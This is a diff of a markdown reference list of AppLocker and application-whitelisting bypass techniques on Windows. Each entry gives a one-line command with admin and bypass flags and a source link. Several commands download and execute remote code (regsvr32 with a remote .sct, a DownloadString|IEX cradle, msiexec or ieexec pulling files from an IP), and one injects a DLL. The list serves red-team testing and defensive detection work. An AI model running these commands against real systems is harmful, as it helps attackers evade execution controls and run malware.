@@ -29,9 +29,9 @@ Please contribute and do point out errors or resources I have forgotten.
 
 `rundll32 shell32.dll,Control_RunDLL payload.dll`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: No
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: No  
 
 Notes:
 
@@ -46,9 +46,9 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Run
 
 `regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: No
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: No  
 
 Notes: 
 
@@ -62,9 +62,9 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Reg
 
 `msbuild.exe pshell.xml`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: Yes
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: Yes  
 
 Notes:
 
@@ -84,9 +84,9 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Tru
 `regsvcs.exe /U regsvcs.dll`
 `regsvcs.exe regsvcs.dll`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: No
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: No  
 
 Notes:
 
@@ -102,9 +102,9 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Reg
 `regasm.exe /U regsvcs.dll`
 `regasm.exe regsvcs.dll`
 
-Requires admin: /U does not require admin
-Windows binary: Yes
-Bypasses AppLocker Default rules: No
+Requires admin: /U does not require admin  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: No  
 
 Notes:
 
@@ -119,9 +119,9 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Reg
 
 `bginfo.exe bginfo.bgi /popup /nolicprompt`
 
-Requires admin: No
-Windows binary: No
-Bypasses AppLocker Default rules: No
+Requires admin: No  
+Windows binary: No  
+Bypasses AppLocker Default rules: No  
 
 Notes:
 
@@ -137,9 +137,9 @@ https://msitpros.com/?p=3860
 
 `InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: No
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: No  
 
 Notes:
 
@@ -156,9 +156,9 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Ins
 
 `Open .diagcab package`
 
-Requires admin: ?
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -171,9 +171,9 @@ https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble
 
 `mshta.exe evilfile.hta`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -186,9 +186,9 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
 
 `cmd.exe /k < script.txt`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -201,9 +201,9 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 `Get-Content script.txt | iex`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -216,9 +216,9 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 `cscript.exe //E:vbscript script.txt`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -231,9 +231,9 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 Missing Example
 
-Requires admin: ?
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 
 Notes:
@@ -247,9 +247,9 @@ https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simp
 
 Missing Example
 
-Requires admin: ?
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 
 Notes:
@@ -263,8 +263,8 @@ https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simp
 
 `ieexec.exe http://x.x.x.x:8080/bypass.exe`
 
-Requires admin: ?
-Windows binary: Yes
+Requires admin: ?  
+Windows binary: Yes  
 Bypasses AppLocker Default rules: ?
 
 Notes:
@@ -278,9 +278,9 @@ https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieex
 
 `cdb.exe -cf x64_calc.wds -o notepad.exe`
 
-Requires admin: ?
-Windows binary: No
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: No  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -292,9 +292,9 @@ http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
 
 `dnx.exe consoleapp`
 
-Requires admin: ?
-Windows binary: No
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: No  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -307,9 +307,9 @@ https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx
 
 `rcsi.exe bypass.csx`
 
-Requires admin: ?
-Windows binary: No
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: No  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -322,9 +322,9 @@ https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcs
 
 Missing example
 
-Requires admin: ?
-Windows binary: No
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: No  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -337,9 +337,9 @@ https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/
 
 `Control.exe`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -353,9 +353,9 @@ https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulat
 
 `msxsl.exe customers.xml script.xsl`
 
-Requires admin: No
-Windows binary: No
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: No  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -370,9 +370,9 @@ https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1
 `msiexec /quiet /i cmd.msi`
 `msiexec /q /i http://192.168.100.3/tmp/cmd.png`
 
-Requires admin: ?
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -384,9 +384,9 @@ https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
 
 `cmstp.exe /ni /s c:\cmstp\CorpVPN.inf`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -400,9 +400,9 @@ https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
 `xwizard.exe argument1 argument2`
 DLL loading in same folder xwizard.dll
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -414,9 +414,9 @@ http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
 
 `fsi.exe c:\folder\d.fscript`
 
-Requires admin: No
-Windows binary: No
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: No  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -431,9 +431,9 @@ https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/
 
 `odbcconf -f file.rsp`
 
-Requires admin: ?
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -446,9 +446,9 @@ https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b
 
 `te.exe bypass.wsc`
 
-Requires admin: No
-Windows binary: No
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: No  
+Bypasses AppLocker Default rules: ?  
 
 Notes: Can be used if the Test Authoring and Execution Framework is installed and is in a path that is whitelisted. 
 Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAEF
@@ -467,9 +467,9 @@ The following folders are by default writable and executable by normal users
 `C:\Windows\Tasks`
 `C:\windows\tracing`
 
-Requires admin: No
-Windows binary: N/A
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: N/A  
+Bypasses AppLocker Default rules: ?  
 
 Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions
 
@@ -479,9 +479,9 @@ Notes: This list is based on Windows 10 1709. Run accesschk to verify on other W
 
 `ATBroker.exe /start malware`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -494,9 +494,9 @@ http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/
 
 `wmic process call create calc`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes: 
 
@@ -509,9 +509,9 @@ https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create
 
 `MavInject32.exe <PID> /INJECTRUNNING <PATH DLL>`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes: 
 
@@ -525,9 +525,9 @@ https://twitter.com/Hexacorn/status/776122138063409152
 
 `pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes: 
 
@@ -541,9 +541,9 @@ https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
 
 `slmgr.vbs`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes: Requires registry keys for com object.
 
@@ -557,9 +557,9 @@ https://www.youtube.com/watch?v=3gz1QmiMhss
 
 `winrm quickconfig`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes: Requires registry keys for com object.
 
@@ -573,9 +573,9 @@ https://www.youtube.com/watch?v=3gz1QmiMhss
 
 `forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -589,9 +589,9 @@ https://twitter.com/vector_sec/status/896049052642533376
 `SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
 `
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -604,9 +604,9 @@ https://twitter.com/monoxgas/status/895045566090010624
 
 `InfDefaultInstall.exe shady.inf`
 
-Requires admin: ?
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: ?  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -620,9 +620,9 @@ https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a
 
 `winword.exe /l dllfile.dll`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -635,9 +635,9 @@ https://twitter.com/subTee/status/884615369511636992
 
 `runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test`
 
-Requires admin: No
-Windows binary: Yes
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 
@@ -650,9 +650,9 @@ https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthel
 
 `Tracker.exe /d .\calc.dll /c C:\Windows\write.exe`
 
-Requires admin: No
-Windows binary: No
-Bypasses AppLocker Default rules: ?
+Requires admin: No  
+Windows binary: No  
+Bypasses AppLocker Default rules: ?  
 
 Notes:
 Part of Visual studio. 
